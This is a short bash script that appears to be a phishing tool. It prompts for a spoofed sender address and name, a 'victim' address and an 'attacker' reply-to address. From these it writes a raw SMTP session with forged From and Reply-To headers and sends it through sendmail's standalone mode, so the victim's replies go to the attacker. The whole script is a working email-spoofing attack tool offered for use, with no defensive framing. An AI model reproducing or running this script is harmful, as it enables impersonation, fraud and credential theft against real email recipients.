#! /bin/bash
rm -rf reply-to.txt
clear

# Spoof first and last name are used to make the "friendly" name that gmail uses
echo -n "Enter Spoof Friendly First Name: "
read friendly_first
echo -n "Enter Spoof Friendly Last Name: "
read friendly_last

# Spoof address is the person you want to appear to be sending the email from.
echo -n "Enter Spoof Address: "
read spoof

# Victim address is the target you wish to receive the phishing email.
echo -n "Enter Victim Address: "
read victim

# Attacker address is the email you want the victim's reply to go to.
echo -n "Enter Attacker Address: "
read attacker

# Message subject
echo -n "Enter Subject: "
read subject

######IMPORTANT#####
# To enter a new line in an email type '\\n' (no quotes and no space after the 'n' or
# the message spacing will be off.
echo "Enter Message: "
read message

# The following uses the above input to create a text file that will be read by the 
#sendmail command. 
{
echo "ehlo aspmx.l.google.com"
echo "MAIL FROM: <"$spoof">"
echo "RCPT TO: <"$victim">"
echo "DATA"
echo "to: <"$victim">"
echo "from: <"$spoof">"
echo "reply-to: \"$friendly_first\\ \\$friendly_last\ \"<$attacker>"
echo "subject: "$subject
echo
echo
echo -e $message
echo
echo "."
echo "quit"
} >> reply-to.txt

#"-bs" switch enables the standalone SMTP server mode. 
#This allows sendmail to read/write input from standard input. Allows for .txt file input
sendmail -bs < reply-to.txt

rm -rf reply-to.txt
clear
#echo "Hello "$(tr [:lower:] [:upper:] <<< ${victim:0:1})${victim:1} | cut -f 1  -d '.' ","
